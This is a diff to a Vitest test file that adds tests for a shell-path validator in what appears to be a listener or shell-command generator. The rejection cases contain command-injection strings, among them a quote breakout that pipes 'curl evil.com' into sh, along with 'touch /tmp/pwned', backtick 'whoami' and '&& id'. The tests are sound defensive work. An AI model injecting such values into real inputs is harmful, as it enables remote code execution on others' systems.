@@ -1,5 +1,5 @@
 import { describe, expect, it } from "vitest";
-import { clampPort, defaultListener, isValidPort, validateHost } from "./validation";
+import { clampPort, defaultListener, isValidPort, isValidShellPath, validateHost } from "./validation";
 
 describe("isValidPort", () => {
   it("rejects 0 and accepts the boundaries 1 and 65535", () => {
@@ -55,6 +55,26 @@ describe("validateHost", () => {
   it("rejects empty input", () => {
     const result = validateHost("   ");
     expect(result.ok).toBe(false);
+  });
+});
+
+describe("isValidShellPath", () => {
+  it("accepts common shell paths", () => {
+    expect(isValidShellPath("/bin/bash")).toBe(true);
+    expect(isValidShellPath("/bin/sh")).toBe(true);
+    expect(isValidShellPath("busybox")).toBe(true);
+  });
+
+  it("rejects values that could break out of a quoted template (socat/osascript render shellPath inside quotes)", () => {
+    expect(isValidShellPath("/bin/sh'; curl evil.com|sh; echo '")).toBe(false);
+    expect(isValidShellPath('/bin/sh"; touch /tmp/pwned; echo "')).toBe(false);
+    expect(isValidShellPath("/bin/sh `whoami`")).toBe(false);
+    expect(isValidShellPath("/bin/sh && id")).toBe(false);
+  });
+
+  it("rejects empty/whitespace-only input", () => {
+    expect(isValidShellPath("")).toBe(false);
+    expect(isValidShellPath("   ")).toBe(false);
   });
 });
 
